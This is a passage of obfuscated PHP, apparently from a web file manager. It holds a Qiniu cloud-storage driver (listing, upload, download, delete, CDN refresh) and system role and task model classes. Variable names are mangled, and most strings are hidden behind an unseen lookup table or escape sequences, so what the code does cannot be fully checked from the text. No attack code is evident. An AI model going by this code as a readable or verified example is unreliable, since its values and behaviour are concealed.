&& I18n::getType() == $ßõ¤»ÔŸ[1508]) { if ($Ê©á¶·¬ == 1) { $ê°òìß = str_replace($ßõ¤»ÔŸ[1509], $ßõ¤»ÔŸ[1510], $ê°òìß); } else { if ($Ê©á¶·¬ == 2) { $ù™Æºå = explode($ßõ¤»ÔŸ[215], $ù™Æºå[0]); $œ¸¿ËÎ = isset($ù™Æºå[1]) ? $ù™Æºå[1] : $ßõ¤»ÔŸ[12]; $„Âƒ™…£ = array($ßõ¤»ÔŸ[1511] => $ßõ¤»ÔŸ[1512], $ßõ¤»ÔŸ[1513] => $ßõ¤»ÔŸ[1514], $ßõ¤»ÔŸ[1515] => $ßõ¤»ÔŸ[1516], $ßõ¤»ÔŸ[1517] => $ßõ¤»ÔŸ[1518], $ßõ¤»ÔŸ[1519] => $ßõ¤»ÔŸ[1520], $ßõ¤»ÔŸ[1521] => $ßõ¤»ÔŸ[1522], $ßõ¤»ÔŸ[1523] => $ßõ¤»ÔŸ[1524], $ßõ¤»ÔŸ[1525] => $ßõ¤»ÔŸ[1526], $ßõ¤»ÔŸ[1527] => $ßõ¤»ÔŸ[1528], $ßõ¤»ÔŸ[1529] => $ßõ¤»ÔŸ[1530]); if (isset($„Âƒ™…£[$œ¸¿ËÎ])) { $ê°òìß = $„Âƒ™…£[$œ¸¿ËÎ]; } } } if (stripos($ê°òìß, $ßõ¤»ÔŸ[1531])) { $ê°òìß = $ßõ¤»ÔŸ[1532]; } } if (!trim($ê°òìß)) { return; } parent::writeLog(trim($ê°òìß), $Î–¦Üñ†); } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($ùÖÚ×’¢) { parent::__construct(); require_once SDK_DIR . $_SERVER[äô®•½Â][1533]; $this->_init($ùÖÚ×’¢); } public function _init($óÂÔääØ) { $¸êÂ¡¿ =& $_SERVER[äô®•½Â]; $this->config = $óÂÔääØ; foreach ($óÂÔääØ as $£†£ñıƒ => $çŞâ±ç‡) { if (isset($this->{$£†£ñıƒ})) { $this->{$£†£ñıƒ} = $çŞâ±ç‡; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($¸êÂ¡¿[1534] . LNG($¸êÂ¡¿[1470])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($ÑÂøëÚÄ, $¦•í¡Ó‰ = '', $¡Œîõûô = REPEAT_RENAME) { if ($this->setContent($ÑÂøëÚÄ, $¦•í¡Ó‰)) { return $this->getPathOuter($ÑÂøëÚÄ); } return !1; } public function mkdir($¦ß³“Ò, $˜¹›¨Ã = REPEAT_SKIP) { $ÍÑï¬çŠ =& $_SERVER[äô®•½Â]; $Áç‘™ÀÇ = trim($¦ß³“Ò, $ÍÑï¬çŠ[8]); if ($this->_isFolder($Áç‘™ÀÇ)) { return $this->getPathOuter($Áç‘™ÀÇ); } $¦ß³“Ò = $Áç‘™ÀÇ . $ÍÑï¬çŠ[8]; $ŠÁ“¤‚Ğ = get_path_this($Áç‘™ÀÇ); $Ö©§™ = $¦ß³“Ò . $ŠÁ“¤‚Ğ; if (!$this->mkfile($Ö©§™)) { return !1; } if (!$this->moveFile($Ö©§™, $¦ß³“Ò)) { $this->delFile($Ö©§™); return !1; } return $this->getPathOuter($Áç‘™ÀÇ); } public function copyFile($ÌºŠ†š´, $ıƒÑ¹Ëø) { $ˆÃú‘ü = $this->bucketManager->copy($this->bucket, $ÌºŠ†š´, $this->bucket, $ıƒÑ¹Ëø, !0); return $ˆÃú‘ü ? !1 : $this->getPathOuter($ıƒÑ¹Ëø); } public function moveFile($–§·Ëãæ, $å†™ù¶) { $– äËêñ = $this->bucketManager->move($this->bucket, $–§·Ëãæ, $this->bucket, $å†™ù¶, !0); return $– äËêñ ? !1 : $this->getPathOuter($å†™ù¶); } public function delFile($ÊØñ­Ü) { if (!$this->exist($ÊØñ­Ü)) { return !0; } $˜…Ş¤Ñì = $this->bucketManager->delete($this->bucket, $ÊØñ­Ü); if (!$˜…Ş¤Ñì) { return !0; } return $˜…Ş¤Ñì->code() == 612 ? !0 : !1; } public function delFolder($È†™«ü) { $Å»¸›‚¡ =& $_SERVER[äô®•½Â]; if (!$this->exist($È†™«ü)) { return !0; } $this->listItemCache = !1; $ó±àÚõ¥ = $this->fileList($È†™«ü); $this->listItemCache = !0; $çÚø˜‡‡ = trim($È†™«ü, $Å»¸›‚¡[8]) . $Å»¸›‚¡[8]; if (!empty($È†™«ü) && $È†™«ü !== $Å»¸›‚¡[231] && !in_array($çÚø˜‡‡, $ó±àÚõ¥[$Å»¸›‚¡[85]])) { $ó±àÚõ¥[$Å»¸›‚¡[85]][] = $çÚø˜‡‡; } $òó„ÑŞ¨ = $this->delByBatch($ó±àÚõ¥[$Å»¸›‚¡[86]]); if (!$òó„ÑŞ¨) { return !1; } $òó„ÑŞ¨ = $this->delByBatch($ó±àÚõ¥[$Å»¸›‚¡[85]]); if (!$òó„ÑŞ¨) { return !1; } return $this->delFile($çÚø˜‡‡); } private function delByBatch($ÌÈ±şô‘) { foreach (array_chunk($ÌÈ±şô‘, 1000) as $‚¯ÑìîÊ) { $¸‰œÓÎ¹ = $this->bucketManager->buildBatchDelete($this->bucket, $‚¯ÑìîÊ); list($†ƒæ·Ş›, $•šíèí°) = $this->bucketManager->batch($¸‰œÓÎ¹); if ($•šíèí°) { return !1; } } return !0; } public function rename($ò£ûõôï, $…Ú÷ùÆ«) { return $this->renameObject($ò£ûõôï, $…Ú÷ùÆ«); } public function fileInfo($º¾¨Êº, $ËÎŞÎÊ = false, $­ğå ¹Ş = array()) { $¨ÔİŒÔ× =& $_SERVER[äô®•½Â]; $‡™×‡“À = array($¨ÔİŒÔ×[32] => $this->pathThis($º¾¨Êº), $¨ÔİŒÔ×[87] => $this->getPathOuter($¨ÔİŒÔ×[8] . $º¾¨Êº), $¨ÔİŒÔ×[33] => $¨ÔİŒÔ×[233], $¨ÔİŒÔ×[79] => isset($­ğå ¹Ş[$¨ÔİŒÔ×[1535]]) ? $­ğå ¹Ş[$¨ÔİŒÔ×[1535]] : 0, $¨ÔİŒÔ×[169] => $this->ext($º¾¨Êº)); if ($ËÎŞÎÊ) { return $‡™×‡“À; } $‡™×‡“À[$¨ÔİŒÔ×[234]] = $‡™×‡“À[$¨ÔİŒÔ×[88]] = 0; $‡™×‡“À[$¨ÔİŒÔ×[235]] = $‡™×‡“À[$¨ÔİŒÔ×[236]] = !0; if (empty($­ğå ¹Ş)) { $­ğå ¹Ş = $this->objectMeta($º¾¨Êº); if (!$­ğå ¹Ş) { return $‡™×‡“À; } } if (isset($­ğå ¹Ş[$¨ÔİŒÔ×[237]]) && $­ğå ¹Ş[$¨ÔİŒÔ×[237]]) { $‡™×‡“À[$¨ÔİŒÔ×[238]] = $­ğå ¹Ş[$¨ÔİŒÔ×[237]]; } if (isset($­ğå ¹Ş[$¨ÔİŒÔ×[248]]) && $­ğå ¹Ş[$¨ÔİŒÔ×[248]]) { $‡™×‡“À[$¨ÔİŒÔ×[238]] = $­ğå ¹Ş[$¨ÔİŒÔ×[248]]; } if (isset($­ğå ¹Ş[$¨ÔİŒÔ×[1536]])) { $‡™×‡“À[$¨ÔİŒÔ×[88]] = substr($­ğå ¹Ş[$¨ÔİŒÔ×[1536]] . $¨ÔİŒÔ×[12], 0, 10); } if (isset($­ğå ¹Ş[$¨ÔİŒÔ×[1535]])) { $‡™×‡“À[$¨ÔİŒÔ×[79]] = $­ğå ¹Ş[$¨ÔİŒÔ×[1535]]; } return $‡™×‡“À; } public function folderInfo($ÇÍá™Ë¶, $ïÂÉÅï£ = false) { $¢õ¼ı§Ú =& $_SERVER[äô®•½Â]; $÷Ä¼°ßË = array($¢õ¼ı§Ú[32] => $this->pathThis($ÇÍá™Ë¶), $¢õ¼ı§Ú[87] => $this->getPathOuter($¢õ¼ı§Ú[8] . $ÇÍá™Ë¶), $¢õ¼ı§Ú[33] => $¢õ¼ı§Ú[78]); if ($ïÂÉÅï£) { return $÷Ä¼°ßË; } $÷Ä¼°ßË[$¢õ¼ı§Ú[234]] = $÷Ä¼°ßË[$¢õ¼ı§Ú[88]] = 0; $÷Ä¼°ßË[$¢õ¼ı§Ú[235]] = $÷Ä¼°ßË[$¢õ¼ı§Ú[236]] = !0; $ÇÍá™Ë¶ = rtrim($ÇÍá™Ë¶, $¢õ¼ı§Ú[8]) . $¢õ¼ı§Ú[8]; $ø˜œáãú = $this->objectMeta($ÇÍá™Ë¶); if (isset($ø˜œáãú[$¢õ¼ı§Ú[1536]])) { $÷Ä¼°ßË[$¢õ¼ı§Ú[88]] = substr($ø˜œáãú[$¢õ¼ı§Ú[1536]] . $¢õ¼ı§Ú[12], 0, 10); } return $÷Ä¼°ßË; } public function listPath($ŞšÕıìè, $’ËŒç‹ú = false) { $éš´Ğçü =& $_SERVER[äô®•½Â]; $ö¿ï›É = $this->fileList($ŞšÕıìè, $éš´Ğçü[8], !0); foreach ($ö¿ï›É[$éš´Ğçü[85]] as $ŞÉ²È­Ê => $ÖŞÃ¡ÎÛ) { $ö¿ï›É[$éš´Ğçü[85]][$ŞÉ²È­Ê] = $this->folderInfo($ÖŞÃ¡ÎÛ, $’ËŒç‹ú); } foreach ($ö¿ï›É[$éš´Ğçü[86]] as $ŞÉ²È­Ê => $ÖŞÃ¡ÎÛ) { $ö¿ï›É[$éš´Ğçü[86]][$ŞÉ²È­Ê] = $this->fileInfo($ÖŞÃ¡ÎÛ[$éš´Ğçü[32]], $’ËŒç‹ú, $ÖŞÃ¡ÎÛ); } return $ö¿ï›É; } public function has($æ‚æÓƒ·, $—µ‡‹™Ú = false, $˜¤ü¼û„ = true) { $é‰ªï =& $_SERVER[äô®•½Â]; $æ‚æÓƒ· = trim($æ‚æÓƒ·, $é‰ªï[8]); $§ëöÔˆ‚ = empty($æ‚æÓƒ·) && $æ‚æÓƒ· !== $é‰ªï[231] ? $é‰ªï[12] : $æ‚æÓƒ· . $é‰ªï[8]; $‡ØıÃ— = $é‰ªï[12]; $Ë—şñûÑ = 500; $¶ª¶ş©ô = $é‰ªï[8]; $Êä·›ûÖ = $º•ÈèÁ© = 0; while (!0) { check_abort(); list($“´ÕŒÎ€, $ÅÇîà²°) = $this->bucketManager->listFiles($this->bucket, $§ëöÔˆ‚, $‡ØıÃ—, $Ë—şñûÑ, $¶ª¶ş©ô); if ($ÅÇîà²°) { break; } $‡ØıÃ— = array_key_exists($é‰ªï[1482], $“´ÕŒÎ€) ? $‡ØıÃ— = $“´ÕŒÎ€[$é‰ªï[1537]] : $é‰ªï[12]; if ($—µ‡‹™Ú) { if (!empty($“´ÕŒÎ€[$é‰ªï[1538]])) { $Êä·›ûÖ += count($“´ÕŒÎ€[$é‰ªï[1538]]); } if (!empty($“´ÕŒÎ€[$é‰ªï[1539]])) { $º•ÈèÁ© += count($“´ÕŒÎ€[$é‰ªï[1539]]); } if ($‡ØıÃ— === $é‰ªï[12]) { break; } continue; } if ($˜¤ü¼û„) { if (!empty($“´ÕŒÎ€[$é‰ªï[1538]])) { return !0; } } else { if (!empty($“´ÕŒÎ€[$é‰ªï[1539]])) { return !0; } } if ($‡ØıÃ— === $é‰ªï[12]) { break; } } if ($—µ‡‹™Ú) { return array($é‰ªï[242] => $Êä·›ûÖ, $é‰ªï[243] => $º•ÈèÁ©); } return !1; } public function listAll($¿Çà£Ÿ) { $Ü„ñ¬–À =& $_SERVER[äô®•½Â]; $†Ã‹Òºâ = $this->fileList($¿Çà£Ÿ, $Ü„ñ¬–À[12], !0); $Æ§Ë˜ÔÂ = array_to_keyvalue($†Ã‹Òºâ[$Ü„ñ¬–À[86]], $Ü„ñ¬–À[32]); foreach ($†Ã‹Òºâ[$Ü„ñ¬–À[85]] as $Ø´ƒ—§¯) { if (is_string($Ø´ƒ—§¯)) { $Æ§Ë˜ÔÂ[$Ø´ƒ—§¯] = array($Ü„ñ¬–À[79] => 0); } } return $this->listAllFiles($¿Çà£Ÿ, $Æ§Ë˜ÔÂ); } private function fileList($µ”ˆû†Ë, $¬®èõ…Ğ = '', $ÚºÇå¾Ú = 0) { $ªìê÷şš =& $_SERVER[äô®•½Â]; $µ”ˆû†Ë = trim($µ”ˆû†Ë, $ªìê÷şš[8]); $°ô·Ÿğ = empty($µ”ˆû†Ë) && $µ”ˆû†Ë !== $ªìê÷şš[231] ? $ªìê÷şš[12] : $µ”ˆû†Ë . $ªìê÷şš[8]; $¾…¯îŒœ = $ªìê÷şš[12]; $µïá¸Ìç = 1000; $ÇõÇ‚Ö = $ßÑàÒ„ = array(); while (!0) { check_abort(); list($–ƒ—ÄÛ¼, $‹Æ³„á±) = $this->bucketManager->listFiles($this->bucket, $°ô·Ÿğ, $¾…¯îŒœ, $µïá¸Ìç, $¬®èõ…Ğ); if ($‹Æ³„á±) { break; } $¾…¯îŒœ = array_key_exists($ªìê÷şš[1482], $–ƒ—ÄÛ¼) ? $¾…¯îŒœ = $–ƒ—ÄÛ¼[$ªìê÷şš[1537]] : $ªìê÷şš[12]; $šø˜¼‡‡ = isset($–ƒ—ÄÛ¼[$ªìê÷şš[1538]]) ? $–ƒ—ÄÛ¼[$ªìê÷şš[1538]] : array(); $Î¤¯íŞ¨ = isset($–ƒ—ÄÛ¼[$ªìê÷şš[1539]]) ? $–ƒ—ÄÛ¼[$ªìê÷şš[1539]] : array(); foreach ($šø˜¼‡‡ as $Ô±öÍÉ¿) { if ($Ô±öÍÉ¿[$ªìê÷şš[97]] == $°ô·Ÿğ) { continue; } $õ¢¦ìö = $Ô±öÍÉ¿[$ªìê÷şš[97]]; $¡‚µ¥Å„ = $Ô±öÍÉ¿[$ªìê÷şš[1535]]; $Ô±öÍÉ¿[$ªìê÷şš[32]] = $õ¢¦ìö; $Ô±öÍÉ¿[$ªìê÷şš[79]] = $¡‚µ¥Å„; $©Çé‚óå = $¡‚µ¥Å„ == 0 && substr($õ¢¦ìö, strlen($õ¢¦ìö) - 1, 1) == $ªìê÷şš[8] ? !0 : !1; $this->cacheMethodInfoSet($õ¢¦ìö, $©Çé‚óå, $Ô±öÍÉ¿); if ($©Çé‚óå) { $ÇõÇ‚Ö[] = $õ¢¦ìö; continue; } $ßÑàÒ„[] = $ÚºÇå¾Ú ? $Ô±öÍÉ¿ : $õ¢¦ìö; } foreach ($Î¤¯íŞ¨ as $õ¢¦ìö) { if ($õ¢¦ìö == $°ô·Ÿğ) { continue; } $ÇõÇ‚Ö[] = $õ¢¦ìö; $this->cacheMethodInfoSet($õ¢¦ìö, !0); } if ($¾…¯îŒœ === $ªìê÷şš[12]) { break; } } $this->cacheMethodInfoSet($µ”ˆû†Ë, !0); return array($ªìê÷şš[85] => $ÇõÇ‚Ö, $ªìê÷şš[86] => $ßÑàÒ„); } public function canRead($æıŞæõ„) { return $this->exist($æıŞæõ„) ? !0 : !1; } public function canWrite($ÀìÀâÄ) { return $this->exist($ÀìÀâÄ) ? !0 : !1; } public function getContent($™¢’…¢ ) { return $this->fileSubstr($™¢’…¢ , 0, -1); } public function setContent($­Ì‚µî¬, $€ùõÚ†Ô = '') { $íãàİ = $this->tempFile($this->pathThis($­Ì‚µî¬)); file_put_contents($íãàİ, $€ùõÚ†Ô); if ($this->upload($­Ì‚µî¬, $íãàİ)) { $this->tempFileRemve($íãàİ); return !0; } return !1; } public function refreshUrls($Ùü•ìù) { $âù¡Ğô =& $_SERVER[äô®•½Â]; $Ş‘õÃ‹ = array(); if (is_array($Ùü•ìù)) { foreach ($Ùü•ìù as $”š©œ³ú) { $Ş‘õÃ‹[] = $this->link($”š©œ³ú); } } else { $Ş‘õÃ‹[] = $this->link($Ùü•ìù); } $éğ˜Ä‹â = new Qiniu\Cdn\CdnManager($this->auth); list($³ÜØ¯üè, $…Å¨„Àö) = $éğ˜Ä‹â->refreshUrls($Ş‘õÃ‹); if ($…Å¨„Àö) { return !1; } return $³ÜØ¯üè[$âù¡Ğô[1262]] == $âù¡Ğô[825] ? !0 : !1; } public function fileSubstr($¡Ñ¬¶Ó‹, $Öü½²Ù©, $íëåÆË¤) { $£–şèû… =& $_SERVER[äô®•½Â]; if (!($¡£Ç‚ ú = $this->link($¡Ñ¬¶Ó‹))) { return !1; } $ÖşÑ¨Š  = !1; if ($íëåÆË¤ > 0) { $§Ú’ÔµÙ = $Öü½²Ù© + $íëåÆË¤ - 1; $ÖşÑ¨Š  = array($£–şèû…[1540] . $Öü½²Ù© . $£–şèû…[473] . $§Ú’ÔµÙ); } $å³ô¤¿À = url_request($¡£Ç‚ ú, $£–şèû…[1501], !1, $ÖşÑ¨Š ); return $å³ô¤¿À[$£–şèû…[815]] ? $å³ô¤¿À[$£–şèû…[1285]] : !1; } public function upload($ú¾ÉøÕÆ, $©›à¹“, $ˆùßŒÈñ = false, $Üİø‡€Ñ = REPEAT_REPLACE) { $úµûÎ‰Ç = new Qiniu\Storage\UploadManager(); $Ôı„³Œ = $this->auth->uploadToken($this->bucket, $ú¾ÉøÕÆ); $ãÄæ™ = get_file_mime(get_path_ext($©›à¹“)); list($·¢²®çè, $˜óìåÆ) = $úµûÎ‰Ç->putFile($Ôı„³Œ, $ú¾ÉøÕÆ, $©›à¹“, null, $ãÄæ™); return $˜óìåÆ ? !1 : $this->getPathOuter($ú¾ÉøÕÆ); } public function uploadFormData($¯’òŒ™Š, $¶©ñåŒô = 3600) { return $this->uploadToken($¯’òŒ™Š, $¶©ñåŒô); } public function uploadMultiData($„‡ÔÓ®, $¼—Øñğş = 3600) { return $this->uploadToken($„‡ÔÓ®, $¼—Øñğş); } private function uploadToken($õĞ“¢•ü, $ùñ©Éİ˜ = 3600) { $İŞãÚ¿  =& $_SERVER[äô®•½Â]; $×ü±˜ƒ = $ùñ©Éİ˜; $ìÚşìÛË = array($İŞãÚ¿ [1541] => $İŞãÚ¿ [1542]); $­ø×”¤Ê = $õĞ“¢•ü; $²ÑŸæÎ = $this->auth->uploadToken($this->bucket, $­ø×”¤Ê, $×ü±˜ƒ, $ìÚşìÛË, !0); $öÂªÓïÊ = empty($this->region) || $this->region == $İŞãÚ¿ [1543] ? $İŞãÚ¿ [12] : $İŞãÚ¿ [473] . $this->region; $å¯²İ‹ = http_type() . "\72\x2f\x2f\165\160\x6c\x6f\x61\144{$öÂªÓïÊ}\56\x71\x69\x6e\151\x75\x70\x2e\143\x6f\155\57"; return array($İŞãÚ¿ [1544] => $²ÑŸæÎ, $İŞãÚ¿ [1545] => $å¯²İ‹); } public function download($ÂÖÄüÜ, $ŞÖñåø•) { $—å¯ª¯ï = IO::getPathInner(IO::mkfile($ŞÖñåø•)); if (!($ˆÙî¶û = $this->link($ÂÖÄüÜ))) { return !1; } $µ©²·‡Ã = 0; $£Ö½ô¿ = 1024 * 200; $Øéİº©” = fopen($—å¯ª¯ï, $_SERVER[äô®•½Â][1546]); while (!0) { $èæ¼‘Ô = $this->fileSubstr($ÂÖÄüÜ, $µ©²·‡Ã, $£Ö½ô¿); if ($èæ¼‘Ô === !1) { return !1; } fwrite($Øéİº©”, $èæ¼‘Ô); $µ©²·‡Ã += $£Ö½ô¿; if (strlen($èæ¼‘Ô) < $£Ö½ô¿) { break; } } fclose($Øéİº©”); return $ŞÖñåø•; } public function link($»š‹°Âš, $ÃĞÃ®Œ‡ = '') { if (!$this->isFile($»š‹°Âš)) { return !1; } $¥ØÑÇ¿™ = $this->getHost() . $_SERVER[äô®•½Â][8] . $this->pathEncode($»š‹°Âš) . $ÃĞÃ®Œ‡; return $this->auth->privateDownloadUrl($¥ØÑÇ¿™, 3600 * 12); } public function fileOut($ıÎôƒ¡ê, $†¿Ÿşï£ = false, $ÔÈŸ»û² = false, $‡ô»İƒí = '') { $Ë×Œà·ù =& $_SERVER[äô®•½Â]; if ($this->isFileOutServer()) { return $this->fileOutServer($ıÎôƒ¡ê, $†¿Ÿşï£, $ÔÈŸ»û², $‡ô»İƒí); } if (!$ÔÈŸ»û²) { $ÔÈŸ»û² = $this->pathThis($ıÎôƒ¡ê); } $ä´˜•ÁÈ = $†¿Ÿşï£ ? $Ë×Œà·ù[1547] . rawurlencode($ÔÈŸ»û²) : $Ë×Œà·ù[12]; $²ÄÂ³õ = $this->link($ıÎôƒ¡ê, $ä´˜•ÁÈ); $this->fileOutLink($²ÄÂ³õ); } public function fileOutServer($ËßÒÔ©, $¥Êèìâ = false, $±àÁ´È• = false, $Ş¦şçÎŸ = '') { parent::fileOut($ËßÒÔ©, $¥Êèìâ, $±àÁ´È•, $Ş¦şçÎŸ); } public function fileOutImage($Ù°£¼¢è, $ÚµÜ²ò³ = 250) { if ($this->size($Ù°£¼¢è) > 1024 * 1024 * 20) { return $this->fileOutImageServer($Ù°£¼¢è, $ÚµÜ²ò³); } $éÛ·­¦½ = $this->link($Ù°£¼¢è, $_SERVER[äô®•½Â][1548] . $ÚµÜ²ò³); $this->fileOutLink($éÛ·­¦½); } public function fileOutImageServer($™µ¹Şœ—, $Â’ú«ò = 250) { parent::fileOutImage($™µ¹Şœ—, $Â’ú«ò); } public function hashMd5($’ÆøÛÑ) { $ØÒı”ê… =& $_SERVER[äô®•½Â]; $«ØÃ°ãŠ = $this->objectMeta($’ÆøÛÑ); return isset($«ØÃ°ãŠ[$ØÒı”ê…[248]]) ? $«ØÃ°ãŠ[$ØÒı”ê…[248]] : !1; $È³”–ŒÎ = $this->link($’ÆøÛÑ, $ØÒı”ê…[1549]); } public function size($ş›«´) { $í’ª‰ñ  = $this->objectMeta($ş›«´); return $í’ª‰ñ  ? $í’ª‰ñ [$_SERVER[äô®•½Â][79]] : 0; } public function info($úá‚¶ş) { if ($this->isFolder($úá‚¶ş)) { return $this->folderInfo($úá‚¶ş); } else { if ($this->isFile($úá‚¶ş)) { return $this->fileInfo($úá‚¶ş); } } return !1; } public function exist($»é£ÇÊŸ) { return $this->isFile($»é£ÇÊŸ) || $this->isFolder($»é£ÇÊŸ); } public function isFile($Ú”—Ç·´) { return !$this->isFolder($Ú”—Ç·´) && $this->objectMeta($Ú”—Ç·´); } public function isFolder($›²ÛïÒÖ) { return $this->cacheMethod($_SERVER[äô®•½Â][180], $›²ÛïÒÖ); } protected function objectMeta($î¸ÆŸâ®) { return $this->cacheMethod($_SERVER[äô®•½Â][182], $î¸ÆŸâ®); } protected function _objectMeta($´İ¯à‡) { $­şàóŸ‡ =& $_SERVER[äô®•½Â]; list($¸ŸÖù, $¿ŸÒÇò³) = $this->bucketManager->stat($this->bucket, $´İ¯à‡); if ($¸ŸÖù) { $¸ŸÖù[$­şàóŸ‡[79]] = intval($¸ŸÖù[$­şàóŸ‡[1535]]); } return $¸ŸÖù; } protected function _isFolder($Á³½ùî) { $Ë¯ÓŠß» =& $_SERVER[äô®•½Â]; if ($Á³½ùî == $Ë¯ÓŠß»[12] || $Á³½ùî == $Ë¯ÓŠß»[8]) { return !0; } list($µ÷×­Æ, $õÄÊÀ«) = $this->bucketManager->listFiles($this->bucket, trim($Á³½ùî, $Ë¯ÓŠß»[8]) . $Ë¯ÓŠß»[8], $Ë¯ÓŠß»[12], 1, $Ë¯ÓŠß»[8]); return !empty($µ÷×­Æ[$Ë¯ÓŠß»[1538]]) || !empty($µ÷×­Æ[$Ë¯ÓŠß»[1539]]) ? !0 : !1; } } goto eÏÌ³ˆ¼©‘; b†²‘¿×: class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\x6d\56\x72\157\154\145\114\151\163\164"; public $field = array("\156\x61\x6d\x65", "\x61\165\164\150", "\x6c\x61\142\x65\154", "\x64\x69\x73\160\x6c\x61\x79", "\163\x79\x73\x74\x65\155", "\144\145\x73\143", "\x69\147\x6e\x6f\x72\145\105\x78\164", "\x69\147\x6e\157\x72\145\x46\151\x6c\145\123\151\x7a\145", "\x61\x64\155\151\x6e\151\x73\x74\162\x61\x74\157\x72", "\163\x6f\162\x74"); public function listData($éàÕ„ú = false, $é…©Ïõ = "\x73\x6f\x72\x74", $îŠ¡¡£ = false) { $“±÷…Îœ =& $_SERVER[äô®•½Â]; $‰–Ù£øº = parent::listData($éàÕ„ú, $é…©Ïõ, $îŠ¡¡£); if (!$éàÕ„ú) { foreach ($‰–Ù£øº as $££…Áõ => $¹ËÇØ½) { if ($¹ËÇØ½[$“±÷…Îœ[2189]] == 1) { $‰–Ù£øº[$££…Áõ][$“±÷…Îœ[537]] = LNG($“±÷…Îœ[2465]); } } } return $‰–Ù£øº; } public function update($Ë²Ç€µ, $§íÄ±Ì„) { $‰ó™‚Æ× =& $_SERVER[äô®•½Â]; $¾ÃŸÄ²Í = parent::listData($Ë²Ç€µ); $éÅÄáÏ = $this->findByName($§íÄ±Ì„[$‰ó™‚Æ×[32]]); if (!$¾ÃŸÄ²Í || $éÅÄáÏ && $éÅÄáÏ[$‰ó™‚Æ×[486]] != $¾ÃŸÄ²Í[$‰ó™‚Æ×[486]]) { return !1; } if ($éÅÄáÏ[$‰ó™‚Æ×[2189]] == 1) { $§íÄ±Ì„ = array($‰ó™‚Æ×[32] => $§íÄ±Ì„[$‰ó™‚Æ×[32]], $‰ó™‚Æ×[2000] => $§íÄ±Ì„[$‰ó™‚Æ×[2000]]); } $this->filterAuth($§íÄ±Ì„[$‰ó™‚Æ×[498]]); return parent::update($Ë²Ç€µ, $§íÄ±Ì„); } public function remove($ÂÔ¶ ·) { $ÍêóŸ› = parent::listData($ÂÔ¶ ·); if (!$ÍêóŸ› || $ÍêóŸ›[$_SERVER[äô®•½Â][192]]) { return !1; } return parent::remove($ÂÔ¶ ·); } public function add($©­’ÀÁá) { $ö÷ùŒÊÕ =& $_SERVER[äô®•½Â]; $Ë ©ŞÁ = $©­’ÀÁá[$ö÷ùŒÊÕ[32]]; if ($this->findByName($Ë ©ŞÁ)) { return !1; } $Ä¡ç€“ö = array($ö÷ùŒÊÕ[505] => $Ë ©ŞÁ, $ö÷ùŒÊÕ[1983] => $ö÷ùŒÊÕ[12], $ö÷ùŒÊÕ[1979] => $ö÷ùŒÊÕ[1987], $ö÷ùŒÊÕ[2466] => 1, $ö÷ùŒÊÕ[1982] => 0, $ö÷ùŒÊÕ[2467] => 0, $ö÷ùŒÊÕ[1981] => $this->getSort()); $©­’ÀÁá = array_merge($Ä¡ç€“ö, $©­’ÀÁá); $this->filterAuth($©­’ÀÁá[$ö÷ùŒÊÕ[498]]); return parent::insert($©­’ÀÁá); } private function getSort() { $òşÑ²£ =& $_SERVER[äô®•½Â]; $§›¨Ğƒ = parent::listData(); $Ÿõ¥£Êğ = array_to_keyvalue($§›¨Ğƒ, $òşÑ²£[12], $òşÑ²£[2001]); return empty($Ÿõ¥£Êğ) ? 0 : max($Ÿõ¥£Êğ) + 1; } private function filterAuth(&$Ò÷©õï) { $ìò¥ÑËÜ =& $_SERVER[äô®•½Â]; $§±áú¡‰ = array(); $ğí‘˜¶’ = array_filter(explode($ìò¥ÑËÜ[50], $Ò÷©õï)); foreach ($ğí‘˜¶’ as $Ò÷©õï) { $ëïêçÆ¾ = explode($ìò¥ÑËÜ[10], $Ò÷©õï); if ($ëïêçÆ¾[0] == $ìò¥ÑËÜ[2468] && $ëïêçÆ¾[1] != $ìò¥ÑËÜ[1273]) { $şÔ„ÇÄ = $ëïêçÆ¾[0] . $ìò¥ÑËÜ[10] . $ëïêçÆ¾[1] . $ìò¥ÑËÜ[2469]; if (!in_array($şÔ„ÇÄ, $ğí‘˜¶’)) { $§±áú¡‰[] = $şÔ„ÇÄ; } } $§±áú¡‰[] = $Ò÷©õï; } $Ò÷©õï = implode($ìò¥ÑËÜ[50], $§±áú¡‰); } public function findRoleDefault() { $±²·Õûñ =& $_SERVER[äô®•½Â]; $üˆ¤Å´¦ = parent::listData(); $å×¬”†ı = !1; foreach ($üˆ¤Å´¦ as $©Ö¶´µ¦) { if (!$©Ö¶´µ¦ || $©Ö¶´µ¦[$±²·Õûñ[1999]] == $±²·Õûñ[231] || $©Ö¶´µ¦[$±²·Õûñ[2189]] == 1) { continue; } if (strstr($©Ö¶´µ¦[$±²·Õûñ[498]], $±²·Õûñ[2470])) { continue; } if (!strstr($©Ö¶´µ¦[$±²·Õûñ[498]], $±²·Õûñ[2471])) { continue; } if (!$å×¬”†ı) { $å×¬”†ı = $©Ö¶´µ¦; continue; } $·ïÅçß˜ = explode($±²·Õûñ[50], $å×¬”†ı[$±²·Õûñ[498]]); $ò£æĞ = explode($±²·Õûñ[50], $©Ö¶´µ¦[$±²·Õûñ[498]]); if (count($·ïÅçß˜) > count($ò£æĞ)) { $å×¬”†ı = $©Ö¶´µ¦; } } return $å×¬”†ı ? $å×¬”†ı[$±²·Õûñ[486]] : $±²·Õûñ[12]; } public function sort($Î³ÍîÆã, $Ôí©Âíô) { return parent::update($Î³ÍîÆã, $Ôí©Âíô); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\x6d\x2e\164\141\163\x6b\114\151\163\x74"; public $field = array("\x6e\x61\155\145", "\x74\x79\x70\x65", "\145\x76\145\156\164", "\x74\151\x6d\145", "\x64\145\x73\143", "\x73\171\x73\x74\145\155", "\x65\x6e\141\x62\x6c\145", "\154\x61\x73\x74\x52\165\156", "\x73\x6f\162\164"); public function listData($Š¨ÕÍêÄ = false, $‡Ä×šèÂ = "\x73\x6f\162\x74", $ê––®¨É = false) { return parent::listData($Š¨ÕÍêÄ, 